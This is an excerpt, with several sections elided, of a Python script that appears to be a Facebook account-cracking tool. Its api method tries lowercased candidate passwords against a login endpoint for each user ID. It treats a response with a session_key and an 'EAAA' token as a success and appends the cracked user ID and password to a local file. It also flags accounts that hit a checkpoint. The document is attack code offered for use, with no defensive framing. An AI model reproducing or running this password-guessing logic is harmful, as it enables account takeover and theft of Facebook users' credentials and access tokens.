...
class Main:
	def __init__(self):
		...
		print(" ( https://github.com/Mr-Azan )\n") 
		...
		if tanya in ["", " "]:
		    ...
		    os.system(" xdg-open https://www.facebook.com/profile.php?id=100003948075974")
		    time.sleep(3)		    		   
		    Main()
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [Z O X-OK]:-%s - [Z O X-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SUCCESSFUL-ZOX❤️] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[CHECKPOINT-ZOX💔] %s • %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print(" [•] GITHUB : https://github.com/MR-AZAN")
		exit()
	else:
		Main()
